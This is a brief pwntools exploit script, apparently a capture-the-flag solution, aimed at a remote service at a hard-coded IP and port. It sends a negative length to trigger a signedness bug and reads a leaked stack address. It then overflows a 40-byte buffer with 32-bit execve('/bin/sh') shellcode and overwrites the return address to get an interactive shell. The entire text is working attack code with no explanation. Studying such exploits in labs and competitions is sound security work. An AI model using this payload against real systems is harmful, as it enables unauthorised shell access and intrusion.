from pwn import *

r = remote('221.149.226.120', 31337)
# r = process('./super_safe.o')

r.recvuntil(b'input length : \n')

r.sendline(b'-1')

stack = r.recvuntil(b'\n')[:-1][8:]
print(stack)
stack = int(stack,16)

shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
ex = shellcode + b'a'*(40-len(shellcode))
ex += b'b'*4
ex += b'c'*4
ex += p32(stack)

r.sendline(ex)

r.interactive()
